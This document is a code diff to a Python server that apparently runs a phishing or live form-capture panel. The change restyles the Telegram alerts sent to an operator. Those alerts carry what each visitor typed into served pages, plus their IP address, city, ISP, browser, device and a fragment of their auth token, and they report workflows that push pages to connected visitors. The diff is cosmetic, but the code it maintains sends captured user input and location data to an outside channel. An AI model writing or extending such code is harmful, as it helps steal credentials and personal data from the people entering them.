@@ -1011,6 +1011,60 @@ def _tg_esc(value: Any, limit: int = 0) -> str:
     return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
 
 
+# ---------------------------------------------------------------------------
+# Telegram message styling
+# ---------------------------------------------------------------------------
+# These notifications are read on a phone by an operator watching a job run,
+# so they are laid out as a small tree: an icon-titled header, then branches
+# drawn with box-drawing characters. Labels are italic, values monospace, and
+# every internal term is translated into plain English — nobody watching a
+# capture should have to decode "settled (blur)".
+_TG_TEE = "\u251c\u2500"      # |-
+_TG_ELL = "\u2514\u2500"      # └─
+
+
+def _tg_tree(rows):
+    """Render (icon, label, value) triples as a branch tree.
+
+    Rows with an empty value are dropped so we never emit a dangling
+    branch like "City — " with nothing after it.
+    """
+    kept = [(ic, lb, v) for (ic, lb, v) in rows if str(v if v is not None else '').strip()]
+    if not kept:
+        return ""
+    out = []
+    last = len(kept) - 1
+    for i, (icon, label, value) in enumerate(kept):
+        branch = _TG_ELL if i == last else _TG_TEE
+        out.append("%s %s <i>%s</i> \u2014 %s" % (branch, icon, label, value))
+    return "\n".join(out)
+
+
+# Internal flush reasons -> what an operator actually sees.
+_TG_REASON_LABELS = {
+    "settled (blur)": "Finished typing",
+    "settled": "Finished typing",
+    "blur": "Finished typing",
+    "disconnect": "Client left the page",
+    "submit": "Pressed the submit button",
+    "page change": "Moved to another page",
+    "page loaded": "Page finished loading",
+    "nav": "Moved on",
+    "pagehide": "Closed the page",
+}
+
+
+def _tg_reason(reason):
+    """Translate an internal flush reason into plain English."""
+    key = (reason or "").strip().lower()
+    if not key:
+        return "Details captured"
+    if key in _TG_REASON_LABELS:
+        return _TG_REASON_LABELS[key]
+    # Unknown reason: de-jargon it a little rather than echoing raw internals.
+    return key.replace("_", " ").strip().capitalize()
+
+
 def _tg_flag(flag: str, default: bool = True) -> bool:
     val = (telegram_config or {}).get(flag)
     if val is None:
@@ -1286,19 +1340,24 @@ def _lpv_final_flush(client_id: str, reason: str = "") -> None:
     try:
         items = list(fields.items())[:15]
         lines = []
+        last = len(items) - 1
         for i, (k, v) in enumerate(items):
             if isinstance(v, list):
                 v = ", ".join(str(x) for x in v)
-            lines.append(f"• <b>{_tg_esc(k, 32)}:</b> <code>{_tg_esc(v, 120)}</code>")
+            branch = _TG_ELL if i == last else _TG_TEE
+            lines.append(
+                f"{branch} <b>{_tg_esc(k, 32)}</b> \u2014 <code>{_tg_esc(v, 120)}</code>"
+            )
         body = "\n".join(lines)
-        trigger_text = f"Input completed ({_tg_esc(reason, 24)})" if reason else "Input completed"
         tg_notify(
-            f"<b>CAPTURED FORM DATA</b>\n\n"
-            f"<b>Source Page:</b> {_tg_esc(buf.get('page_name') or buf.get('page_id') or '-', 60)}\n"
-            f"<b>Event:</b> {trigger_text}\n"
-            f"<b>Client ID:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>\n\n"
-            f"<b>Captured Fields:</b>\n"
-            f"{body}",
+            "\U0001F4DD <b>DETAILS CAPTURED</b>\n\n"
+            + _tg_tree([
+                ("\U0001F4C4", "Page", _tg_esc(buf.get('page_name') or buf.get('page_id') or '-', 60)),
+                ("\u26A1", "When", _tg_esc(_tg_reason(reason), 40)),
+                ("\U0001F464", "Client", f"<code>{_tg_esc(str(client_id)[-10:])}</code>"),
+            ])
+            + "\n\n\U0001F510 <b>What they entered</b>\n"
+            + body,
             "notify_lpv_final",
         )
     except Exception:
@@ -6178,10 +6237,12 @@ async def _run_workflow_on_client(
     except Exception:
         pass
     tg_notify(
-        f"<b>WORKFLOW INITIATED</b>\n\n"
-        f"<b>Workflow:</b> {_tg_esc(workflow.get('name') or workflow.get('id') or '-', 60)}\n"
-        f"<b>Total Steps:</b> {len(workflow.get('steps') or [])}\n"
-        f"<b>Client ID:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
+        "\U0001F680 <b>WORKFLOW STARTED</b>\n\n"
+        + _tg_tree([
+            ("\U0001F4CB", "Workflow", _tg_esc(workflow.get('name') or workflow.get('id') or '-', 60)),
+            ("\U0001F522", "Steps", str(len(workflow.get('steps') or []))),
+            ("\U0001F464", "Client", f"<code>{_tg_esc(str(client_id)[-10:])}</code>"),
+        ]),
         "notify_lpv_workflow",
     )
     # Track last pushed page so redirect events have a page context.
@@ -6406,10 +6467,12 @@ async def _run_workflow_on_client(
         "payload": {"workflow_id": workflow.get("id"), "name": workflow.get("name")},
     })
     tg_notify(
-        f"<b>WORKFLOW COMPLETED</b>\n\n"
-        f"<b>Workflow:</b> {_tg_esc(workflow.get('name') or workflow.get('id') or '-', 60)}\n"
-        f"<b>Completed Steps:</b> {len(steps)}\n"
-        f"<b>Client ID:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
+        "\U0001F3C1 <b>WORKFLOW FINISHED</b>\n\n"
+        + _tg_tree([
+            ("\U0001F4CB", "Workflow", _tg_esc(workflow.get('name') or workflow.get('id') or '-', 60)),
+            ("\u2705", "Steps completed", str(len(steps))),
+            ("\U0001F464", "Client", f"<code>{_tg_esc(str(client_id)[-10:])}</code>"),
+        ]),
         "notify_lpv_workflow",
     )
 
@@ -7128,6 +7191,23 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
             wf_boot = lpv_store.get_workflow(auto_id)
         except Exception:
             wf_boot = None
+    # A workflow link must start from the workflow, not from a generic
+    # landing page: the workflow pushes its own first step, and pointing
+    # the client at a default page it never uploaded just makes it fetch
+    # a 404 on boot ("Failed to load resource: 404").
+    # Without a workflow, still only advertise a default page that really
+    # exists in the archive.
+    if wf_boot:
+        default_page = ""
+        default_url = ""
+    else:
+        try:
+            if not lpv_store.get_page(default_page):
+                default_page = ""
+                default_url = ""
+        except Exception:
+            default_page = ""
+            default_url = ""
     parent_connection = _lpv_parent_connections.get(profile_parent_id)
     if (
         parent_connection
@@ -7226,11 +7306,11 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
         if wf_boot:
             wf_label = f"{_tg_esc(wf_boot.get('name') or 'unnamed', 60)}"
             wf_via = "link" if per_link_id else "global auto-run"
-            wf_line = f"<b>Workflow:</b> {wf_label} ({wf_via})\n"
+            wf_line = f"{wf_label} <i>({wf_via})</i>"
         else:
             wf_line = ""
         auth_frag = (init_data.get("auth_token") or "")[:8]
-        link_line = f"<b>Auth Token:</b> <code>{_tg_esc(auth_frag)}…</code>\n" if auth_frag else ""
+        link_line = f"<code>{_tg_esc(auth_frag)}\u2026</code>" if auth_frag else ""
         if init_data.get("is_mobile"):
             device_type = "Mobile"
         elif init_data.get("is_touch"):
@@ -7244,21 +7324,26 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
         _region = (loc.get('state') or '-').strip()
         _city = (loc.get('city') or '-').strip()
         _isp = (loc.get("isp") or "").strip()
-        isp_line = f"\n• <b>ISP:</b> {_tg_esc(_isp, 60)}" if _isp else ""
         tg_notify(
-            f"<b>CLIENT SESSION STARTED</b>\n\n"
-            f"<b>Client ID:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>\n"
-            f"{wf_line}"
-            f"{link_line}\n"
-            f"<b>Network &amp; Location:</b>\n"
-            f"• <b>IP:</b> <code>{_tg_esc(ip)}</code>\n"
-            f"• <b>Country:</b> {_tg_esc(_country)}\n"
-            f"• <b>Region:</b> {_tg_esc(_region)}\n"
-            f"• <b>City:</b> {_tg_esc(_city)}"
-            f"{isp_line}\n\n"
-            f"<b>Device &amp; Environment:</b>\n"
-            f"• <b>Type:</b> {_tg_esc(device_type)} ({_tg_esc(size)})\n"
-            f"• <b>User-Agent:</b> <code>{_tg_esc(ua)}</code>",
+            "\U0001F7E2 <b>CLIENT CONNECTED</b>\n\n"
+            + _tg_tree([
+                ("\U0001F464", "Client", f"<code>{_tg_esc(str(client_id)[-10:])}</code>"),
+                ("\U0001F680", "Workflow", wf_line),
+                ("\U0001F511", "Pass code", link_line),
+            ])
+            + "\n\n\U0001F30D <b>Location &amp; network</b>\n"
+            + _tg_tree([
+                ("\U0001F6F0", "IP address", f"<code>{_tg_esc(ip)}</code>"),
+                ("\U0001F30E", "Country", _tg_esc(_country)),
+                ("\U0001F4CD", "Region", _tg_esc(_region)),
+                ("\U0001F3D9", "City", _tg_esc(_city)),
+                ("\U0001F4E1", "Internet provider", _tg_esc(_isp, 60)),
+            ])
+            + "\n\n\U0001F4F1 <b>Device</b>\n"
+            + _tg_tree([
+                ("\U0001F5A5", "Type", f"{_tg_esc(device_type)} ({_tg_esc(size)})"),
+                ("\U0001F9EC", "Browser", f"<code>{_tg_esc(ua, 90)}</code>"),
+            ]),
             "notify_connect",
         )
     except Exception:
@@ -7552,9 +7637,11 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
             _m, _s = divmod(_dur, 60)
             _dur_txt = f"{_m}m {_s}s" if _m else f"{_s}s"
             tg_notify(
-                f"<b>CLIENT SESSION ENDED</b>\n\n"
-                f"<b>Session Duration:</b> {_dur_txt}\n"
-                f"<b>Client ID:</b> <code>{_tg_esc(str(client_id)[-10:])}</code>",
+                "\U0001F534 <b>CLIENT DISCONNECTED</b>\n\n"
+                + _tg_tree([
+                    ("\u23F1", "Time on page", _dur_txt),
+                    ("\U0001F464", "Client", f"<code>{_tg_esc(str(client_id)[-10:])}</code>"),
+                ]),
                 "notify_disconnect",
             )
         except Exception:
